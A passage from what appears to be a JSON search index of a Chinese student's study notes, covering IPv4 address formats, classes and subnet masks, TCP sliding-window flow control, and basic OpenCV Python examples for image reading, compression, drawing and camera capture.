\u6216\u8005\u8bf4\u6210\u662f\u7f51\u7edc\u53f7\u52a0\u4e3b\u673a\u53f7 \u5b50\u7f51\u63a9\u7801\uff1a 1 11111111 11111111 11111111 00000000\u4e2d\uff0c\u524d\u4e09\u4e2a\u5b57\u8282\u51681\uff0c\u4ee3\u8868\u5bf9\u5e94IP\u5730\u5740\u4e2d\u6700\u9ad8\u7684\u4e09\u4e2a\u5b57\u8282\u4e3a\u7f51\u7edc\u5730\u5740\uff1b\u540e\u4e00\u4e2a\u5b57\u8282\u51680\uff0c\u4ee3\u8868\u5bf9\u5e94IP\u5730\u5740\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5b57\u8282\u4e3a\u4e3b\u673a\u5730\u5740\u3002\u8fd9\u79cd\u4f4d\u6a21\u5f0f\u53eb\u505a\u5b50\u7f51\u6a21\uff08subnet mask\uff09\u6216\u201c\u5b50\u7f51\u63a9\u7801\u201d\u3002 \u8ba1\u7b97 192.9.200.13 \uff0c\u9ed8\u8ba4\u7684\u5b50\u7f51\u63a9\u7801\u4e3a 255.255.255.0 \u5982\u4f55\u8ba1\u7b97\u5f97\u5230\u7f51\u7edc\u53f7\u548c\u4e3b\u673a\u53f7\uff1f 1 2 \u7f51\u7edc\u53f7\uff1a192.9.200.0 \u4e3b\u673a\u53f7: 0.0.0.13 \u53c2\u8003 \u00b6 https://blog.csdn.net/mr_orange_klj/article/details/46128295 https://blog.csdn.net/gatieme/article/details/50989257 \u65e0\u7c7b\u522b\u95f4\u57df\u8def\u7531 ipv4","title":"ip\u5730\u5740"},{"location":"2019\u5b66\u671f/network/ip\u5730\u5740/#ip","text":"ipv4","title":"ip\u5730\u5740"},{"location":"2019\u5b66\u671f/network/ip\u5730\u5740/#_1","text":"IPv4\u5730\u5740\u53ef\u88ab\u5199\u4f5c\u4efb\u4f55\u8868\u793a\u4e00\u4e2a32\u4f4d\u6574\u6570\u503c\u7684\u5f62\u5f0f\uff0c\u4f46\u4e3a\u4e86\u65b9\u4fbf\u4eba\u7c7b\u9605\u8bfb\u548c\u5206\u6790\uff0c\u5b83\u901a\u5e38\u88ab\u5199\u4f5c \u70b9\u5206\u5341\u8fdb\u5236 \u7684\u5f62\u5f0f\uff0c\u5373\u56db\u4e2a\u5b57\u8282\u88ab\u5206\u5f00\u7528 \u5341\u8fdb\u5236 \u5199\u51fa\uff0c\u4e2d\u95f4\u7528\u70b9\u5206\u9694\u3002 \u4e0b\u8868\u5c55\u793a\u4e86\u51e0\u79cd\u4e0d\u540c\u7684\u683c\u5f0f\uff1a \u683c\u5f0f \u503c \u4ece\u70b9\u5206\u5341\u8fdb\u5236\u8f6c\u6362 \u70b9\u5206\u5341\u8fdb\u5236 192.0.2.235 \u4e0d\u9002\u7528 \u70b9\u5206\u5341\u516d\u8fdb\u5236[ 2] 0xC0.0x00.0x02.0xEB \u6bcf\u4e2a\u5b57\u8282\u88ab\u5355\u72ec\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236 \u70b9\u5206\u516b\u8fdb\u5236[ 2] 0300.0000.0002.0353 \u6bcf\u4e2a\u5b57\u8282\u88ab\u5355\u72ec\u8f6c\u6362\u4e3a\u516b\u8fdb\u5236 \u5341\u516d\u8fdb\u5236 0xC00002EB \u5c06\u70b9\u5206\u5341\u516d\u8fdb\u5236\u8fde\u5728\u4e00\u8d77 \u5341\u8fdb\u5236 3221226219 \u7528\u5341\u8fdb\u5236\u5199\u51fa\u768432\u4f4d\u6574\u6570 \u516b\u8fdb\u5236 030000001353 \u7528\u516b\u8fdb\u5236\u5199\u51fa\u768432\u4f4d\u6574\u6570","title":"\u5730\u5740\u683c\u5f0f"},{"location":"2019\u5b66\u671f/network/ip\u5730\u5740/#_2","text":"\u6700\u521d\uff0c\u4e00\u4e2aIP\u5730\u5740\u88ab\u5206\u6210\u4e24\u90e8\u5206\uff1a\u7f51\u7edc\u6807\u8bc6\u7b26\u5728\u5730\u5740\u7684\u9ad8\u4f4d\u5b57\u8282\u4e2d\uff0c\u4e3b\u673a\u6807\u8bc6\u7b26\u5728\u5269\u4e0b\u7684\u90e8\u5206\u4e2d\u3002 \u4e3a\u4e86\u514b\u670d\u8fd9\u4e2a\u9650\u5236\uff0c\u5728\u968f\u540e\u51fa\u73b0\u7684 \u5206\u7c7b\u7f51\u7edc \u4e2d\uff0c\u5730\u5740\u7684\u9ad8\u4f4d\u5b57\u8282\u88ab\u91cd\u5b9a\u4e49\u4e3a\u7f51\u7edc\u7684 \u7c7b (Class)\u3002\u8fd9\u4e2a\u7cfb\u7edf\u5b9a\u4e49\u4e86\u4e94\u4e2a\u7c7b\u522b\uff1aA\u3001B\u3001C\u3001D\u548cE\u3002A\u3001B\u548cC\u7c7b\u6709\u4e0d\u540c\u7684\u7f51\u7edc\u7c7b\u522b\u957f\u5ea6\uff0c\u5269\u4f59\u7684\u90e8\u5206\u88ab\u7528\u6765\u8bc6\u522b\u7f51\u7edc\u5185\u7684\u4e3b\u673a\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u6bcf\u4e2a\u7f51\u7edc\u7c7b\u522b\u6709\u7740\u4e0d\u540c\u7684\u7ed9\u4e3b\u673a\u7f16\u5740\u7684\u80fd\u529b\u3002D\u7c7b\u88ab\u7528\u4e8e \u591a\u64ad \u5730\u5740\uff0cE\u7c7b\u88ab\u7559\u4f5c\u5c06\u6765\u4f7f\u7528\u3002 \u524d8\u4f4d\u5730\u5740\u8303\u56f4 \u7c7b \u8def\u7531\u5f62\u5f0f \u5360\u5730\u5740\u603b\u7a7a\u95f4\u7684\u6bd4\u4f8b \u9ed8\u8ba4\u63a9\u7801 \u7f51\u7edc\u8303\u56f4 0-127 A \u5355\u64ad \u00bd 255.0.0.0/8 0-127.x.x.x 128-191 B \u5355\u64ad \u00bc 255.255.0.0/16 255.255.0.0/16 192-223 C \u5355\u64ad \u215b 255.255.255.0/24 255.255.255.0/24 224-239 D \u591a\u64ad 1/16 240-255 E \u79d1\u7814\u4fdd\u7559 1/16 \u5176\u4e2d A\u7c7b\u5730\u5740\uff1a \u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u4f4d\u59cb\u7ec8\u4e3a0 B\u7c7b\u5730\u5740\uff1a\u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u30012\u4f4d\u59cb\u7ec8\u4e3a10 C\u7c7b\u5730\u5740\uff1a\u7b2c1\u4e2a8\u4f4d\u4e2d\u7684\u7b2c1\u30012\u30013\u4f4d\u59cb\u7ec8\u4e3a110 1 IP\u5730\u5740\u5305\u542b \u7f51\u7edc\u5730\u5740+\u4e3b\u673a\u5730\u5740\uff0c\u5373IP\u5730\u5740=\u7f51\u7edc\u5730\u5740+\u4e3b\u673a\u5730\u5740 \u6216\u8005\u8bf4\u6210\u662f\u7f51\u7edc\u53f7\u52a0\u4e3b\u673a\u53f7 \u5b50\u7f51\u63a9\u7801\uff1a 1 11111111 11111111 11111111 00000000\u4e2d\uff0c\u524d\u4e09\u4e2a\u5b57\u8282\u51681\uff0c\u4ee3\u8868\u5bf9\u5e94IP\u5730\u5740\u4e2d\u6700\u9ad8\u7684\u4e09\u4e2a\u5b57\u8282\u4e3a\u7f51\u7edc\u5730\u5740\uff1b\u540e\u4e00\u4e2a\u5b57\u8282\u51680\uff0c\u4ee3\u8868\u5bf9\u5e94IP\u5730\u5740\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5b57\u8282\u4e3a\u4e3b\u673a\u5730\u5740\u3002\u8fd9\u79cd\u4f4d\u6a21\u5f0f\u53eb\u505a\u5b50\u7f51\u6a21\uff08subnet mask\uff09\u6216\u201c\u5b50\u7f51\u63a9\u7801\u201d\u3002 \u8ba1\u7b97 192.9.200.13 \uff0c\u9ed8\u8ba4\u7684\u5b50\u7f51\u63a9\u7801\u4e3a 255.255.255.0 \u5982\u4f55\u8ba1\u7b97\u5f97\u5230\u7f51\u7edc\u53f7\u548c\u4e3b\u673a\u53f7\uff1f 1 2 \u7f51\u7edc\u53f7\uff1a192.9.200.0 \u4e3b\u673a\u53f7: 0.0.0.13","title":"\u5206\u914d"},{"location":"2019\u5b66\u671f/network/ip\u5730\u5740/#_3","text":"https://blog.csdn.net/mr_orange_klj/article/details/46128295 https://blog.csdn.net/gatieme/article/details/50989257 \u65e0\u7c7b\u522b\u95f4\u57df\u8def\u7531 ipv4","title":"\u53c2\u8003"},{"location":"2019\u5b66\u671f/network/\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae/","text":"TCP\u534f\u8bae\u7684\u6ed1\u52a8\u7a97\u53e3 \u00b6 \u5206\u7c7b\u548c\u4f5c\u7528 \u00b6 TCP\u534f\u8bae\u7684\u6ed1\u52a8\u7a97\u53e3\u5206\u4e3a\u53d1\u9001\u7a97\u53e3\u548c\u63a5\u6536\u7a97\u53e3 \u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\u662f \u4f20\u8f93\u5c42\u8fdb\u884c\u6d41\u63a7 \u7684\u4e00\u79cd\u63aa\u65bd\uff0c \u63a5\u6536\u65b9\u901a\u8fc7\u901a\u544a\u53d1\u9001\u65b9\u81ea\u5df1\u7684\u7a97\u53e3\u5927\u5c0f \uff0c\u4ece\u800c\u63a7\u5236\u53d1\u9001\u65b9\u7684\u53d1\u9001\u901f\u5ea6\uff0c\u4ece\u800c\u8fbe\u5230\u9632\u6b62\u53d1\u9001\u65b9\u53d1\u9001\u901f\u5ea6\u8fc7\u5feb\u800c\u5bfc\u81f4\u81ea\u5df1\u88ab\u6df9\u6ca1\u7684\u76ee\u7684\u3002 \u5982\u4f55\u8ba4\u8bc6ACK \u00b6 ACK\u5305\u542b\u63a5\u6536\u65b9\u671f\u671b\u63a5\u53d7\u5230\u7684\u4e0b\u4e00\u5b57\u8282\u5e8f\u53f7n\uff0c\u8fd9\u4e2an\u4ee3\u8868\u7740\u63a5\u6536\u65b9\u5df2\u7ecf\u6536\u5230\u4e86\u524dn-1\u5b57\u8282\u6570\u636e \u6b64\u65f6\u5982\u679c\u63a5\u6536\u65b9\u63a5\u6536\u5230\u7b2cn+1\u5b57\u8282\u6570\u636e(\u4e0d\u662f\u671f\u671b\u7684\u7b2cn\u5b57\u8282\u6570\u636e)\uff0c\u63a5\u6536\u65b9\u662f\u4e0d\u4f1a\u53d1\u9001\u5e8f\u53f7\u4e3an+2\u7684ACK\u7684 \u540c\u65f6,ACK\u4e2d\u8fd8\u5305\u542b\u7740\u5f53\u524d\u7684\u7a97\u53e3\u5927\u5c0fm\uff0c\u5982\u6b64\u53d1\u9001\u65b9\u5728\u63a5\u6536\u5230ACK\u5305\u542b\u7684\u8fd9\u4e24\u4e2a\u6570\u636e\u540e\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd8\u53ef\u4ee5\u53d1\u9001\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\u7ed9\u5bf9\u65b9 \u53d1\u9001\u7aef\u7a97\u53e3\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e8f\u53f7\u4e00\u5b9a\u662fACK\u4e2d\u671f\u671b\u6536\u5230\u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\u5e8f\u53f7\uff0c\u6bd4\u5982\u4e0b\u56fe\uff1a \u63a5\u53d7\u7aef\u7a97\u53e3\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e8f\u4e4b\u524d\u4e00\u5b9a\u662f\u5df2\u7ecf\u5b8c\u5168\u63a5\u6536\u7684\uff0c\u540e\u9762\u7a97\u53e3\u91cc\u9762\u7684\u6570\u636e\u90fd\u662f\u5e0c\u671b\u63a5\u53d7\u7684\uff0c\u7a97\u53e3\u540e\u9762\u7684\u6570\u636e\u90fd\u662f\u4e0d\u5e0c\u671b\u63a5\u53d7\u7684\u3002 \u53c2\u8003 \u00b6 TCP\u7684\u6ed1\u52a8\u7a97\u53e3\u662f\u600e\u4e48\u63a7\u5236\u6d41\u91cf\u7684 TCP\u7684\u54ea\u4e9b\u4e8b\u513f \u4e00\u7bc7\u5e26\u4f60\u8bfb\u61c2TCP\u6ed1\u52a8\u7a97\u53e3","title":"TCP\u534f\u8bae\u7684\u6ed1\u52a8\u7a97\u53e3"},{"location":"2019\u5b66\u671f/network/\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae/#tcp","text":"","title":"TCP\u534f\u8bae\u7684\u6ed1\u52a8\u7a97\u53e3"},{"location":"2019\u5b66\u671f/network/\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae/#_1","text":"TCP\u534f\u8bae\u7684\u6ed1\u52a8\u7a97\u53e3\u5206\u4e3a\u53d1\u9001\u7a97\u53e3\u548c\u63a5\u6536\u7a97\u53e3 \u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\u662f \u4f20\u8f93\u5c42\u8fdb\u884c\u6d41\u63a7 \u7684\u4e00\u79cd\u63aa\u65bd\uff0c \u63a5\u6536\u65b9\u901a\u8fc7\u901a\u544a\u53d1\u9001\u65b9\u81ea\u5df1\u7684\u7a97\u53e3\u5927\u5c0f \uff0c\u4ece\u800c\u63a7\u5236\u53d1\u9001\u65b9\u7684\u53d1\u9001\u901f\u5ea6\uff0c\u4ece\u800c\u8fbe\u5230\u9632\u6b62\u53d1\u9001\u65b9\u53d1\u9001\u901f\u5ea6\u8fc7\u5feb\u800c\u5bfc\u81f4\u81ea\u5df1\u88ab\u6df9\u6ca1\u7684\u76ee\u7684\u3002","title":"\u5206\u7c7b\u548c\u4f5c\u7528"},{"location":"2019\u5b66\u671f/network/\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae/#ack","text":"ACK\u5305\u542b\u63a5\u6536\u65b9\u671f\u671b\u63a5\u53d7\u5230\u7684\u4e0b\u4e00\u5b57\u8282\u5e8f\u53f7n\uff0c\u8fd9\u4e2an\u4ee3\u8868\u7740\u63a5\u6536\u65b9\u5df2\u7ecf\u6536\u5230\u4e86\u524dn-1\u5b57\u8282\u6570\u636e \u6b64\u65f6\u5982\u679c\u63a5\u6536\u65b9\u63a5\u6536\u5230\u7b2cn+1\u5b57\u8282\u6570\u636e(\u4e0d\u662f\u671f\u671b\u7684\u7b2cn\u5b57\u8282\u6570\u636e)\uff0c\u63a5\u6536\u65b9\u662f\u4e0d\u4f1a\u53d1\u9001\u5e8f\u53f7\u4e3an+2\u7684ACK\u7684 \u540c\u65f6,ACK\u4e2d\u8fd8\u5305\u542b\u7740\u5f53\u524d\u7684\u7a97\u53e3\u5927\u5c0fm\uff0c\u5982\u6b64\u53d1\u9001\u65b9\u5728\u63a5\u6536\u5230ACK\u5305\u542b\u7684\u8fd9\u4e24\u4e2a\u6570\u636e\u540e\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8fd8\u53ef\u4ee5\u53d1\u9001\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\u7ed9\u5bf9\u65b9 \u53d1\u9001\u7aef\u7a97\u53e3\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e8f\u53f7\u4e00\u5b9a\u662fACK\u4e2d\u671f\u671b\u6536\u5230\u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\u5e8f\u53f7\uff0c\u6bd4\u5982\u4e0b\u56fe\uff1a \u63a5\u53d7\u7aef\u7a97\u53e3\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e8f\u4e4b\u524d\u4e00\u5b9a\u662f\u5df2\u7ecf\u5b8c\u5168\u63a5\u6536\u7684\uff0c\u540e\u9762\u7a97\u53e3\u91cc\u9762\u7684\u6570\u636e\u90fd\u662f\u5e0c\u671b\u63a5\u53d7\u7684\uff0c\u7a97\u53e3\u540e\u9762\u7684\u6570\u636e\u90fd\u662f\u4e0d\u5e0c\u671b\u63a5\u53d7\u7684\u3002","title":"\u5982\u4f55\u8ba4\u8bc6ACK"},{"location":"2019\u5b66\u671f/network/\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae/#_2","text":"TCP\u7684\u6ed1\u52a8\u7a97\u53e3\u662f\u600e\u4e48\u63a7\u5236\u6d41\u91cf\u7684 TCP\u7684\u54ea\u4e9b\u4e8b\u513f \u4e00\u7bc7\u5e26\u4f60\u8bfb\u61c2TCP\u6ed1\u52a8\u7a97\u53e3","title":"\u53c2\u8003"},{"location":"2019\u5b66\u671f/network/\u8ba4\u8bc6\u4e92\u8054\u7f51/","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u5165\u95e8 \u00b6 \u5982\u4f55\u8861\u91cf\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6027\u80fd \u00b6 1. \u901f\u7387 \u00b6 \u7f51\u7edc\u6280\u672f\u4e2d\u7684\u901f\u7387\u6307\u7684\u662f\u6570\u636e\u7684\u4f20\u9001\u901f\u7387\uff0c\u4e5f\u6210\u4e3a\u6570\u636e\u7387\u6216\u6bd4\u7279\u7387\uff0c\u5355\u4f4d\u662f bit/s \u6709\u65f6\u4e5f\u5199\u4e3a bps","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u5165\u95e8"},{"location":"2019\u5b66\u671f/network/\u8ba4\u8bc6\u4e92\u8054\u7f51/#_1","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u5165\u95e8"},{"location":"2019\u5b66\u671f/network/\u8ba4\u8bc6\u4e92\u8054\u7f51/#_2","text":"","title":"\u5982\u4f55\u8861\u91cf\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u6027\u80fd"},{"location":"2019\u5b66\u671f/network/\u8ba4\u8bc6\u4e92\u8054\u7f51/#1","text":"\u7f51\u7edc\u6280\u672f\u4e2d\u7684\u901f\u7387\u6307\u7684\u662f\u6570\u636e\u7684\u4f20\u9001\u901f\u7387\uff0c\u4e5f\u6210\u4e3a\u6570\u636e\u7387\u6216\u6bd4\u7279\u7387\uff0c\u5355\u4f4d\u662f bit/s \u6709\u65f6\u4e5f\u5199\u4e3a bps","title":"1. \u901f\u7387"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/","text":"opencv\u57fa\u672c\u64cd\u4f5c \u00b6 \u8bfb\u53d6\u56fe\u50cf \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import cv2 cv2 . namedWindow ( \"Image\" ) image = cv2 . imread ( \"sin.png\" ) # image\u662f\u8fd4\u56de\u7684\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4 # print(image[100,100]) cv2 . imshow ( \"Image\" , image ) k = cv2 . waitKey ( 0 ) & 0xff if k == 27 : cv2 . destroyAllWindows () elif k == ord ( 's' ): cv2 . imwrite ( \"demo.png\" , image ) cv2 . destroyAllWindows () imread \u51fd\u6570\u8bfb\u53d6\u56fe\u50cf\uff0c imshow \u51fd\u6570\u5c55\u793a\u56fe\u50cf, imwrite \u5199\u5165\u56fe\u50cf\uff0c\u4f1a\u6839\u636e\u6587\u4ef6\u540d\u76f4\u63a5\u505a\u8f6c\u6362 BGR2HSV \u00b6 1 2 3 4 5 6 7 8 9 10 import cv2 import numpy as np green = np . uint8 ([[[ 0 , 255 , 0 ]]]) hsv_green = cv2 . cvtColor ( green , cv2 . COLOR_BGR2HSV ) # print(hsv_green) result = [ i for i in dir ( cv2 ) if i . startswith ( 'COLOR' )] print ( result ) cvtColor \u51fd\u6570\u8f6c\u6362\u56fe\u50cf \u56fe\u7247\u538b\u7f29 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import cv2 import numpy as np # \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u65701 \u8868\u793a\u5f69\u8272\u683c\u5f0f\uff0c0\u8868\u793a\u7070\u5ea6\u683c\u5f0f image = cv2 . imread ( \"website.jpg\" , 1 ) e1 = cv2 . getTickCount () # 50\u8868\u793a\u538b\u7f29\u6bd4\uff0c\u662f\u6709\u635f\u538b\u7f29\uff0c\u53d6\u503c\u662f[0,100] cv2 . imwrite ( \"websitetest.jpg\" , image ,[ cv2 . IMWRITE_JPEG_QUALITY , 50 ]) e2 = cv2 . getTickCount () print ( \"\u538b\u7f29\u4e3ajpg\u7684\u65f6\u95f4\u4e3a:{}\" . format ( e2 - e1 )) e3 = cv2 . getTickCount () # \u65e0\u635f\u538b\u7f29\uff0c\u900f\u660e\u5ea6\u5c5e\u6027\u538b\u7f29\u6bd4\u53d6\u503c\u662f[0,9] cv2 . imwrite ( \"websitetest.png\" , image , [ cv2 . IMWRITE_PNG_COMPRESSION , 0 ]) e4 = cv2 . getTickCount () print ( \"\u538b\u7f29\u4e3apng\u7684\u65f6\u95f4\u4e3a{}\" . format ( e4 - e3 )) getTickCount \u51fd\u6570\u83b7\u53d6\u65f6\u95f4\u4f46\u662f\u5bf9\u8fd9\u4e2a\u51fd\u6570\u7684\u4f7f\u7528\u8fd8\u4e0d\u662f\u5f88\u6e05\u695a \u57fa\u672c\u7ed8\u56fe \u00b6 1 2 3 4 5 6 7 8 9 10 11 import cv2 import numpy as np img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( \"Image\" ) cv2 . line ( img , ( 0 , 0 ),( 511 , 511 ),( 255 , 255 , 0 ), 5 ) cv2 . imshow ( \"Image\" , img ) k = cv2 . waitKey ( 0 ) & 0xff if k == 27 : cv2 . destroyAllWindows () cv2.line \u7ed8\u5236\u4e00\u6761\u76f4\u7ebf\uff0c\u9700\u8981\u786e\u5b9a\u56fe\u50cf\uff0c\u8d77\u70b9\u548c\u7ec8\u70b9\uff0c\u8fd8\u6709\u989c\u8272 \u7528\u9f20\u6807\u7ed8\u56fe \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import cv2 # \u5c06cv2\u4e2d\u6240\u6709\u7684\u5305\u542bEVENT\u7684\u6253\u5370\u51fa\u6765 events = [ i for i in dir ( cv2 ) if 'EVENT' in i ] # print(events) import numpy as np def draw_circle ( event , x , y , flags , param ): if event == cv2 . EVENT_LBUTTONDBLCLK : # \u76d1\u542c\u9f20\u6807\u53cc\u51fb\u4e8b\u4ef6 cv2 . circle ( img , ( x , y ), 100 , ( 255 , 0 , 0 ), - 1 ) img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( 'image' ) cv2 . setMouseCallback ( 'image' , draw_circle ) # \u56de\u8c03\u51fd\u6570 while ( 1 ): cv2 . imshow ( 'image' , img ) if cv2 . waitKey ( 20 ) & 0xff == 27 : break cv2 . destroyAllWindows () \u9700\u8981\u81ea\u5df1\u521b\u5efa\u56de\u8c03\u51fd\u6570\uff0c\u540c\u65f6\u76d1\u542c\u4e8b\u4ef6 \u5982\u56fe\u6211\u53cc\u51fb\u7684\u65f6\u5019\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u5706 \u66f4\u9ad8\u7ea7\u4e00\u70b9\u7684\u64cd\u4f5c \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import cv2 import numpy as np drawing = False mode = True ix , iy = - 1 , - 1 def draw_circle ( event , x , y , flags , param ): global ix , iy , drawing , mode if event == cv2 . EVENT_LBUTTONDOWN : drawing = True ix , iy = x , y elif event == cv2 . EVENT_MOUSEMOVE and flags == cv2 . EVENT_FLAG_LBUTTON : if drawing == True : if mode == True : cv2 . rectangle ( img , ( ix , iy ),( x , y ),( 0 , 255 , 0 ), - 1 ) else : cv2 . circle ( img , ( x , y ), 3 , ( 0 , 0 , 255 ), - 1 ) elif event == cv2 . EVENT_LBUTTONUP : drawing = False img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( 'image' ) cv2 . setMouseCallback ( 'image' , draw_circle ) while True : cv2 . imshow ( 'image' , img ) k = cv2 . waitKey ( 1 ) & 0xff if k == ord ( 'm' ): mode = not mode elif k == 27 : break \u901a\u8fc7\u9f20\u6807\u7684\u62d6\u52a8\u53ef\u4ee5\u7ed8\u5236\u4e00\u4e2a\u65b9\u5f62 \u6253\u5f00\u6444\u50cf\u5934\u5f55\u5236\u89c6\u9891 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import cv2 cap = cv2 . VideoCapture ( 0 ) while True : ret , frame = cap . read () # read\u51fd\u6570\u8fd4\u56de\u4e24\u4e2a\u503c\uff1f ret\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u5982\u679c\u8c03\u7528\u6210\u529f\u8fd4\u56deTrue print ( ret ) # gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) # \u8f6c\u7070\u5ea6\u56fe\u50cf cv2 . imshow ( 'frame' , frame ) if cv2 . waitKey ( 1 ) & 0xff == ord ( 'q' ): break cap . release () # \u91ca\u653e cv2 . destroyAllWindows () # \u9500\u6bc1\u6240\u6709\u7684\u7a97\u53e3","title":"opencv\u57fa\u672c\u64cd\u4f5c"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#opencv","text":"","title":"opencv\u57fa\u672c\u64cd\u4f5c"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import cv2 cv2 . namedWindow ( \"Image\" ) image = cv2 . imread ( \"sin.png\" ) # image\u662f\u8fd4\u56de\u7684\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4 # print(image[100,100]) cv2 . imshow ( \"Image\" , image ) k = cv2 . waitKey ( 0 ) & 0xff if k == 27 : cv2 . destroyAllWindows () elif k == ord ( 's' ): cv2 . imwrite ( \"demo.png\" , image ) cv2 . destroyAllWindows () imread \u51fd\u6570\u8bfb\u53d6\u56fe\u50cf\uff0c imshow \u51fd\u6570\u5c55\u793a\u56fe\u50cf, imwrite \u5199\u5165\u56fe\u50cf\uff0c\u4f1a\u6839\u636e\u6587\u4ef6\u540d\u76f4\u63a5\u505a\u8f6c\u6362","title":"\u8bfb\u53d6\u56fe\u50cf"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#bgr2hsv","text":"1 2 3 4 5 6 7 8 9 10 import cv2 import numpy as np green = np . uint8 ([[[ 0 , 255 , 0 ]]]) hsv_green = cv2 . cvtColor ( green , cv2 . COLOR_BGR2HSV ) # print(hsv_green) result = [ i for i in dir ( cv2 ) if i . startswith ( 'COLOR' )] print ( result ) cvtColor \u51fd\u6570\u8f6c\u6362\u56fe\u50cf","title":"BGR2HSV"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import cv2 import numpy as np # \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u65701 \u8868\u793a\u5f69\u8272\u683c\u5f0f\uff0c0\u8868\u793a\u7070\u5ea6\u683c\u5f0f image = cv2 . imread ( \"website.jpg\" , 1 ) e1 = cv2 . getTickCount () # 50\u8868\u793a\u538b\u7f29\u6bd4\uff0c\u662f\u6709\u635f\u538b\u7f29\uff0c\u53d6\u503c\u662f[0,100] cv2 . imwrite ( \"websitetest.jpg\" , image ,[ cv2 . IMWRITE_JPEG_QUALITY , 50 ]) e2 = cv2 . getTickCount () print ( \"\u538b\u7f29\u4e3ajpg\u7684\u65f6\u95f4\u4e3a:{}\" . format ( e2 - e1 )) e3 = cv2 . getTickCount () # \u65e0\u635f\u538b\u7f29\uff0c\u900f\u660e\u5ea6\u5c5e\u6027\u538b\u7f29\u6bd4\u53d6\u503c\u662f[0,9] cv2 . imwrite ( \"websitetest.png\" , image , [ cv2 . IMWRITE_PNG_COMPRESSION , 0 ]) e4 = cv2 . getTickCount () print ( \"\u538b\u7f29\u4e3apng\u7684\u65f6\u95f4\u4e3a{}\" . format ( e4 - e3 )) getTickCount \u51fd\u6570\u83b7\u53d6\u65f6\u95f4\u4f46\u662f\u5bf9\u8fd9\u4e2a\u51fd\u6570\u7684\u4f7f\u7528\u8fd8\u4e0d\u662f\u5f88\u6e05\u695a","title":"\u56fe\u7247\u538b\u7f29"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 import cv2 import numpy as np img = np . zeros (( 512 , 512 , 3 ), np . uint8 ) cv2 . namedWindow ( \"Image\" ) cv2 . line ( img , ( 0 , 0 ),( 511 , 511 ),( 255 , 255 , 0 ), 5 ) cv2 . imshow ( \"Image\" , img ) k = cv2 . waitKey ( 0 ) & 0xff if k == 27 : cv2 . destroyAllWindows () cv2.line \u7ed8\u5236\u4e00\u6761\u76f4\u7ebf\uff0c\u9700\u8981\u786e\u5b9a\u56fe\u50cf\uff0c\u8d77\u70b9\u548c\u7ec8\u70b9\uff0c\u8fd8\u6709\u989c\u8272","title":"\u57fa\u672c\u7ed8\u56fe"},{"location":"2019\u5b66\u671f/\u591a\u5a92\u4f53\u60c5\u62a5/opencv\u57fa\u672c\u64cd\u4f5c/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import cv2 # 